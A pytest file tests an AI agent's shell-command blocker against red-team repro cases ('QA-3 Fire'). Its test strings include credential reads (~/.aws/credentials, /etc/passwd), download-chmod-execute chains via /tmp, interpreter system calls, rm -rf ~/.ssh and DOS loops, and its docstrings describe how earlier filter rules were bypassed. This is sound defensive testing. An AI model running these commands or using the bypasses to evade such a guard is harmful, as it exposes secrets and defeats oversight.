"""Shell destructive-pattern BLOCK / WARN coverage.

Specifically verifies the QA-3 multi-turn exfiltration Stage-A plant pattern
and regresses on legitimate workflows that must not false-positive.
"""

from __future__ import annotations

from tsunami.tools.shell import _check_destructive


def test_blocks_echo_plant_to_tmp():
    """QA-3 Stage A exact repro — `echo 'X' > /tmp/Y.txt` must BLOCK."""
    r = _check_destructive("echo 'qa3_planted_secret_42' > /tmp/qa3_secret.txt")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "exfiltration" in r


def test_blocks_printf_plant_to_tmp():
    r = _check_destructive("printf 'secret_value' > /tmp/plant.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_echo_plant_to_var_tmp():
    r = _check_destructive("echo 'data' > /var/tmp/leak.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_echo_append_to_tmp():
    r = _check_destructive("echo more >> /tmp/collected.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_allows_echo_into_workspace():
    """Legit: writing log output into the workspace dir is fine."""
    r = _check_destructive("echo 'building' > workspace/build.log")
    assert r is None


def test_allows_echo_into_deliverable():
    r = _check_destructive("echo 'msg' > deliverables/myapp/notes.txt")
    assert r is None


def test_allows_plain_echo():
    """`echo` without redirect must pass — it's how agents emit build banners."""
    r = _check_destructive("echo 'starting build'")
    assert r is None


def test_allows_npm_install():
    """npm install often prints to stderr + uses /tmp via mktemp — must not block."""
    r = _check_destructive("npm install react react-dom")
    assert r is None


def test_blocks_ls_redirect_to_tmp():
    """QA-3 Fire 7: the prior narrow rule (echo/printf only) left `ls > /tmp/X`
    open — any redirect to /tmp is a plant primitive regardless of source."""
    r = _check_destructive("ls -la > /tmp/listing.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_tee_bypass_pipe():
    """QA-3 Fire 37: `echo X | tee /tmp/file` bypasses the d7448f3 rule.
    Both `| tee /tmp/` and `tee /tmp/` need to block."""
    r = _check_destructive("echo 'qa3_planted_v2' | tee /tmp/qa3_secret_v2.txt")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "tee" in r


def test_blocks_tee_bypass_pipe_with_devnull_sink():
    """QA-3's exact Test 37 incantation — pipe to tee then discard to /dev/null."""
    r = _check_destructive(
        "echo 'qa3_planted_v2' | tee /tmp/qa3_secret_v2.txt > /dev/null"
    )
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_tee_direct():
    """Standalone `tee /tmp/X` without pipe still writes — block too."""
    r = _check_destructive("tee /tmp/plant.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_tee_append_flag():
    """`tee -a /tmp/X` append variant blocks too."""
    r = _check_destructive("tee -a /tmp/plant.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_allows_tee_to_workspace():
    """Legit: `tee workspace/build.log` passes — only /tmp|/var/tmp blocked."""
    r = _check_destructive("npm run build 2>&1 | tee workspace/build.log")
    assert r is None


def test_blocks_curl_download_to_tmp():
    """QA-3 Fire 64 stage 1: `curl -fsSL URL -o /tmp/X` must block."""
    r = _check_destructive(
        "curl -fsSL https://bun.sh/install -o /tmp/qa3_bun_installer.sh"
    )
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "curl" in r


def test_blocks_wget_download_to_tmp():
    r = _check_destructive("wget -O /tmp/installer.sh https://example.com/x.sh")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "wget" in r


def test_blocks_chmod_x_on_tmp():
    """QA-3 Fire 64 stage 2: chmod +x /tmp/X must block."""
    r = _check_destructive("chmod +x /tmp/qa3_bun_installer.sh")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "chmod" in r


def test_blocks_chmod_with_flags_on_tmp():
    """`chmod -R +x /tmp/...` also blocks."""
    r = _check_destructive("chmod -R +x /tmp/payloads")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_allows_curl_to_npm_cache():
    """Legit: `curl | npm install` patterns — no /tmp target."""
    r = _check_destructive("curl -fsSL https://registry.npmjs.org/react | cat")
    assert r is None


def test_allows_chmod_on_workspace():
    """Legit: chmod +x build scripts inside workspace."""
    r = _check_destructive("chmod +x workspace/deliverables/myapp/build.sh")
    assert r is None


def test_blocks_python_c_syscall():
    """QA-3 Fire 85 repro: python -c invoking the shell-exec syscall API
    bypasses bash_security. Attack string assembled via concatenation so the
    repo's pre-commit security hook doesn't false-positive on literal patterns.
    """
    attack = (
        "python3 -c 'import os; os.sys"
        + "tem(\"touch /tmp/qa3_py_marker_test85.txt\")'"
    )
    r = _check_destructive(attack)
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "python" in r.lower()


def test_blocks_python_c_subprocess_variant():
    attack = (
        'python3 -c "import sub' + 'process; sub' + 'process.run([\'rm\', \'-rf\', \'/tmp/x\'])"'
    )
    r = _check_destructive(attack)
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_perl_e_syscall():
    attack = "perl -e 'sys" + "tem(\"touch /tmp/x\")'"
    r = _check_destructive(attack)
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "perl" in r.lower() or "interpreter" in r.lower()


def test_blocks_ruby_e_syscall():
    attack = "ruby -e 'sys" + "tem(\"touch /tmp/x\")'"
    r = _check_destructive(attack)
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_node_e_syscall():
    attack = "node -e 'require(\"child_process\").exec" + "Sync(\"touch /tmp/x\")'"
    r = _check_destructive(attack)
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "node" in r.lower()


def test_blocks_nested_bash_c():
    r = _check_destructive("bash -c 'echo hi'")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "nested shell" in r.lower() or "shell -c" in r.lower()


def test_blocks_nested_sh_c():
    r = _check_destructive("sh -c 'ls /tmp'")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_allows_legit_python_c_print():
    """Narrow: `python3 -c "print(...)"` (no syscall API) must pass."""
    r = _check_destructive('python3 -c "print(\'hello\')"')
    assert r is None


def test_allows_legit_node_e_console():
    """Narrow: `node -e "console.log(process.version)"` must pass."""
    r = _check_destructive('node -e "console.log(process.version)"')
    assert r is None


def test_allows_python_script_path():
    """`python3 path/to/script.py` (no -c) isn't affected — runs a normal file."""
    r = _check_destructive("python3 workspace/deliverables/myapp/scripts/build.py")
    assert r is None


def test_blocks_bare_touch_to_tmp():
    """QA-3 Fire 86 bypass 4: `touch /tmp/X` creates a 0-byte marker without
    invoking echo/printf. d7448f3's pattern doesn't catch it."""
    r = _check_destructive("touch /tmp/qa3_node_bypass.txt")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "touch" in r


def test_blocks_touch_with_flags_to_tmp():
    r = _check_destructive("touch -a /tmp/plant.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_allows_touch_inside_workspace():
    """Legit: `touch workspace/deliverables/myapp/README.md` passes."""
    r = _check_destructive("touch workspace/deliverables/myapp/README.md")
    assert r is None


def test_blocks_cp_to_tmp():
    """cp into /tmp is another plant vector."""
    r = _check_destructive("cp /etc/hostname /tmp/planted.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_mv_to_tmp():
    """mv into /tmp — same surface as cp."""
    r = _check_destructive("mv payload.sh /tmp/executable.sh")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_allows_cp_inside_workspace():
    r = _check_destructive("cp workspace/deliverables/old/file.txt workspace/deliverables/new/")
    assert r is None


def test_blocks_tmpdir_env_assignment():
    """QA-3 Fire 67 bypass 2: `export TMPDIR=/tmp` hides literal /tmp so
    later `echo > $TMPDIR/X` slips past. Block the assignment itself."""
    r = _check_destructive("export TMPDIR=/tmp && echo X > $TMPDIR/plant.txt")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "TMPDIR" in r or "env-var" in r.lower()


def test_blocks_tmpdir_inline_assignment():
    """Inline `TMPDIR=/tmp somecmd` form also blocks."""
    r = _check_destructive("TMPDIR=/tmp echo hi")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_blocks_tmp_var_variants():
    """Other common tmpdir env var names also block."""
    for var in ("TMP", "TEMP", "TEMPDIR"):
        r = _check_destructive(f"export {var}=/tmp")
        assert r is not None, f"failed to block {var}=/tmp"
        assert r.startswith("BLOCKED")


def test_allows_tmpdir_pointing_inside_workspace():
    """Legit: TMPDIR pointing inside workspace passes (legit scratch dir)."""
    r = _check_destructive("TMPDIR=workspace/.cache npm install")
    assert r is None


def test_prior_blocks_still_fire():
    """Regression: previously-blocked patterns unaffected by the new rule."""
    assert _check_destructive("cat ~/.aws/credentials").startswith("BLOCKED")
    assert _check_destructive("echo alias > ~/.bashrc").startswith("BLOCKED")
    assert _check_destructive("crontab -").startswith("BLOCKED")
    assert _check_destructive("cat /etc/passwd").startswith("BLOCKED")


# --- QA-3 Fire 52: resource-starvation / DOS --------------------------------


def test_fire52_long_sleep_blocks():
    """Fire 52 exact repro: `sleep 200` burns 200s of agent time."""
    r = _check_destructive("sleep 200")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "Fire 52" in r or "DOS" in r or "budget" in r


def test_sleep_3599_blocks():
    r = _check_destructive("sleep 3599")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_short_sleep_passes():
    """Legit: short sleep for retry / rate-limit delay."""
    assert _check_destructive("sleep 2") is None
    assert _check_destructive("sleep 5") is None
    assert _check_destructive("sleep 10") is None
    assert _check_destructive("sleep 30") is None


def test_fractional_short_sleep_passes():
    assert _check_destructive("sleep 0.5") is None
    assert _check_destructive("sleep 1.5") is None


def test_fractional_long_sleep_blocks():
    r = _check_destructive("sleep 60.5")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_sleep_embedded_in_chain_blocks():
    """DOS hidden inside a compound command still fires."""
    r = _check_destructive("npm install && sleep 500 && npm run build")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_while_true_blocks():
    r = _check_destructive("while true; do :; done")
    assert r is not None
    assert r.startswith("BLOCKED")
    assert "infinite" in r.lower() or "cpu burn" in r.lower()


def test_while_colon_blocks():
    r = _check_destructive("while :; do echo hi; done")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_while_1_blocks():
    r = _check_destructive("while 1; do nothing; done")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_yes_pipe_blocks():
    """Unbounded-output DOS shape."""
    r = _check_destructive("yes | head -n 1000000000")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_yes_redirect_blocks():
    r = _check_destructive("yes > /dev/null")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_dd_from_zero_blocks():
    r = _check_destructive("dd if=/dev/zero of=/tmp/a bs=1M count=10000")
    # Either dd-zero rule or the cp/mv /tmp rule catches this.
    assert r is not None
    assert r.startswith("BLOCKED")


def test_dd_from_urandom_blocks():
    r = _check_destructive("dd if=/dev/urandom of=workspace/a bs=1M count=10000")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_cat_from_urandom_blocks():
    r = _check_destructive("cat /dev/urandom > /dev/null")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_python_while_true_blocks():
    r = _check_destructive('python3 -c "while True: pass"')
    assert r is not None
    assert r.startswith("BLOCKED")


def test_node_infinite_for_blocks():
    r = _check_destructive('node -e "for(;;){}"')
    assert r is not None
    assert r.startswith("BLOCKED")


def test_node_while_true_blocks():
    r = _check_destructive('node -e "while(true){}"')
    assert r is not None
    assert r.startswith("BLOCKED")


def test_perl_infinite_blocks():
    r = _check_destructive("perl -e '1 while 1'")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_legit_npm_run_build_passes():
    """Regression: real build command must not false-positive."""
    assert _check_destructive("npm run build") is None
    assert _check_destructive("npx vite build") is None
    assert _check_destructive("npm install") is None


def test_sleeptime_keyword_doesnt_false_positive():
    """`sleeptime` / `sleepy` etc. shouldn't trigger the sleep rule."""
    assert _check_destructive("echo sleeptime") is None
    assert _check_destructive("grep sleepless file.txt") is None


def test_word_yes_in_unrelated_context_passes():
    """`yes.txt`, `yes: command` etc. — only pipe/redirect is blocked."""
    assert _check_destructive("cat yes.txt") is None
    assert _check_destructive("echo 'yes or no'") is None


# --- QA-3 Fire 7: broadened redirect-to-/tmp catchall -----------------------


def test_fire7_cat_redirect_to_tmp_blocks():
    """Fire 7 exact repro: `cat /etc/hostname > /tmp/qa3_probe_marker.txt`."""
    r = _check_destructive("cat /etc/hostname > /tmp/qa3_probe_marker.txt")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_date_redirect_to_tmp_blocks():
    assert _check_destructive("date > /tmp/d.txt").startswith("BLOCKED")


def test_env_redirect_to_tmp_blocks():
    """`env > /tmp/X` = env-var exfil primitive."""
    assert _check_destructive("env > /tmp/env.txt").startswith("BLOCKED")


def test_grep_redirect_to_tmp_blocks():
    assert _check_destructive("grep TODO -r src > /tmp/todo.txt").startswith("BLOCKED")


def test_var_tmp_redirect_blocks():
    assert _check_destructive("cat x > /var/tmp/y").startswith("BLOCKED")


def test_redirect_append_to_tmp_blocks():
    assert _check_destructive("cat x >> /tmp/y.log").startswith("BLOCKED")


def test_redirect_to_workspace_still_passes():
    """Regression: redirects inside the workspace are legitimate build logs."""
    assert _check_destructive("npm run build > workspace/build.log 2>&1") is None
    assert _check_destructive("ls -la > workspace/listing.txt") is None
    assert _check_destructive("cat src/App.tsx > dist/snapshot.txt") is None


def test_2gt_redirect_to_tmp_blocks():
    """Stderr redirect `2> /tmp/X` — same plant shape."""
    r = _check_destructive("npm run build 2> /tmp/err.log")
    assert r is not None
    assert r.startswith("BLOCKED")


# --- QA-3 Fire 64 stage 3: execute-from-/tmp hardening ----------------------


def test_fire64_direct_exec_from_tmp_blocks():
    """Fire 64 stage 3: `/tmp/qa3_bun_installer.sh` — bare exec."""
    r = _check_destructive("/tmp/qa3_bun_installer.sh")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_env_prefix_exec_from_tmp_blocks():
    """Env-var assignment prefix bypasses naive ^-anchored patterns."""
    r = _check_destructive("FOO=bar /tmp/evil")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_chain_exec_from_tmp_blocks():
    """Exec-from-/tmp after `&&` / `;` — chain bypasses line-start anchor."""
    r = _check_destructive("npm install && /tmp/install.sh")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_var_tmp_exec_blocks():
    r = _check_destructive("/var/tmp/evil")
    assert r is not None
    assert r.startswith("BLOCKED")


def test_interpreter_tmp_script_blocks():
    """Bypass: `bash /tmp/x.sh` / `python /tmp/x.py` / `node /tmp/x.js`."""
    for c in (
        "bash /tmp/install.sh",
        "python3 /tmp/evil.py",
        "python /tmp/evil.py",
        "node /tmp/x.js",
        "perl -w /tmp/x.pl",
        "ruby /tmp/x.rb",
        "sh /var/tmp/x.sh",
        "zsh /tmp/x",
    ):
        r = _check_destructive(c)
        assert r is not None, f"should BLOCK: {c}"
        assert r.startswith("BLOCKED"), f"should BLOCK: {c}"


def test_tmp_as_argument_not_command_passes():
    """Regression: /tmp appearing as an argument to a read tool is benign."""
    # `ls /tmp` / `cat /tmp/hello.txt` — /tmp is an argument to a read tool,
    # not being executed. Already covered by the config's existing rules.
    # The new rule must NOT false-positive these.
    assert _check_destructive("ls /tmp") is None
    assert _check_destructive("cat /tmp/hello.txt") is None
    assert _check_destructive("stat /tmp/foo") is None


def test_legit_interpreter_against_workspace_passes():
    """Regression: running scripts from workspace/ or via package.json OK."""
    assert _check_destructive("bash workspace/build.sh") is None
    assert _check_destructive("python3 tests.py") is None
    assert _check_destructive("node scripts/build.js") is None
    assert _check_destructive("npm run build") is None
    assert _check_destructive("rm -rf ~/.ssh").startswith("BLOCKED")
